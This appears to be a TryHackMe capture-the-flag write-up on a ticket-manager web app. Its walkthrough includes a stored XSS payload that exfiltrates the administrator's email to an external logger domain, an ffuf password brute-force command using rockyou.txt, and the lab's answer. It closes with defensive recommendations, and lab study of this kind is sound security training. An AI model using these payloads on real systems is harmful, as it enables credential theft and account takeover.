## 🧠 2. Core Security Concepts

### 📩 Out-of-Band (OOB) / DNS & HTTP Logging
When a web application resides behind a strict firewall blocking direct outbound traffic, Out-of-Band (OOB) techniques (like HTTP/DNS logging servers) are often used to confirm if the application is making external requests.
- **DNS Interaction:** Even if HTTP traffic is blocked, DNS lookups frequently pass through internal DNS servers.
- **HTTP Logging Tool:** Used to record all incoming requests (headers, IP addresses, parameters) sent by the application.

### 🔍 Why did Gobuster give this output?
The Gobuster results show that all scanned paths return a 302 Found status code with a redirection back to the homepage (/):
- Wildcard / Catch-all Routing: The web server is configured so that for any non-existent path, instead of returning a 404 Not Found, it automatically redirects (302 Redirect) to the main page (/).
- Impact on scanning: Since every word in the wordlist returns a 302 response, Gobuster treats all entries as found, creating noise. In such situations, status codes can be excluded in Gobuster (e.g., using --exclude-status 302 or -b 302).

### 🎟️ What is a Ticket Manager?

A Ticket Manager is a standard IT support web application that allows:
1. User Interface: Employees create a new ticket describing a technical problem, attachments, or contact information.
2. Admin/Support Interface: IT support personnel log in through the Login page to review incoming tickets, reply to them, or close them.

### 🛡️ Security Context (SOC & AppSec)

In support web applications, the most common points of interest from a defensive perspective are:
- Input Sanitization: Whether input fields in a ticket (e.g., Subject, Description) properly neutralize HTML/JavaScript characters to prevent unauthorized code execution when an administrator opens the ticket.
- Authentication & Access Control: Checking the security of login forms and session cookies.

### 🕵️ Extracting the Administrator's Email

In the TryHackMe exercise, we use an external request catcher link (e.g., http://10.10.10.100/ or your assigned Request Catcher URL).

#### 🔍 How Request Catcher is used to find the admin's email:

When we inject the JavaScript payload (XSS) into the ticket message field, the code is stored in the database (Stored XSS).
Here is the payload injected into the message field of the ticket creation page:

**var email = document.getElementById("email").innerText;
email = email.replace("@", "0");
email = email.replace(".", "x");document.location = "http://" + email + ".3439ce680a37d50ca0da21d67fcb61eb.log.tryhackme.tech";**

### 🔍 Code Analysis Step-by-Step:

1. </textarea> — Closes the text box to break out of the HTML element.
2. var email = document.getElementById("email").innerText; — Grabs the text from the element with the ID email on the page (where the logged-in administrator's email is written).
  - Replacing special characters (replace):
    - email = email.replace("@", "0"); — Replaces the @ sign with the number 0.
    - email = email.replace(".", "x"); — Replaces the dot . with the letter x.
    - Why is this done? So the email can be safely inserted as a subdomain in a network request (since characters like @ and dots have specific functionality in standard DNS names).
3. document.location = "http://" + email + "..."; — Forces the administrator's browser to make a request to our unique TryHackMe logger domain. When the request reaches the server, the exact email name appears right inside the subdomain name!
4. Replace .3439ce680a37d50ca0da21d67fcb61eb.log.tryhackme.tech with your unique Request Catcher URL from your web browser.
5. Automatic Visit by the Administrator: The system runs a background script or bot (admin) that regularly opens and reviews new tickets submitted by users.
6. Script Execution: When the admin opens our ticket, their web browser automatically executes the hidden JavaScript payload we inserted.
7. Data Exfiltration via Catcher: The payload is set to gather current information (such as document.cookie, user data, or the admin's login email) and send an HTTP request to our Request Catcher link (http://10.10.10.100/...).
8. Result: When you open the Request Catcher page in your browser, the logs will show an incoming request containing the stolen data, including the administrator's email!

### 🔓 Password Brute-Forcing with Ffuf
1. Once we have the administrator's email, we use a tool like ffuf to crack the password on the login form.

**ffuf -w /usr/share/wordlists/rockyou.txt -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://target_ip/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"**

We obtain the administrator's password: **123123**
- ### Answer: **123123**

### 🔍 Detailed Command Analysis:
- ffuf: A powerful and fast web fuzzing and brute-forcing tool written in Go. Used for testing login forms, directories, or parameters with a wordlist.
- -w /usr/share/wordlists/rockyou.txt: Defines the wordlist to use. rockyou.txt is the most famous wordlist containing hundreds of thousands of commonly used passwords.
- -d "email=adminaccount@itsupport.thm&password=FUZZ": Defines the data sent via the POST request to the login form. The keyword FUZZ marks the spot where ffuf dynamically cycles through every password from the rockyou.txt wordlist one by one.
- -u http://target_ip/login: The target URL where requests are sent (the web application's login form).
- -fw 475: Filter Word (response size filter). Tells ffuf to ignore all responses that have a length of exactly 475 characters (these are typically failed login attempts returning identical error messages). Thus, when the correct password is hit, the response size will differ and appear as a successful result!
- -H "Content-Type: application/x-www-form-urlencoded": Adds an HTTP Header informing the web server that the data in the POST request is sent in standard web form format (like clicking the Login button).

### 🔥 EXTRA FROM ME: SOC Analyst Perspective & Defensive Remediation
As a SOC Analyst, IT support tickets are a frequent attack vector (social engineering, malicious links, or attachments).
🛡️ Defensive Recommendations (Defensive Controls):
1. Input Sanitization & Context-Aware Encoding: All data entered into tickets must be strictly filtered to prevent arbitrary code execution in the administrator's browser.
2. Egress Filtering (Outbound Traffic Restriction): Every server on the internal network should have strictly defined rules regarding which IP addresses and protocols it is allowed to contact on the internet.
3. Strict Cookie & Session Flags:
  - HttpOnly: Prevents access to session cookies via JavaScript.
  - SameSite=Strict: Reduces the risk of unauthorized requests from other domains (CSRF).
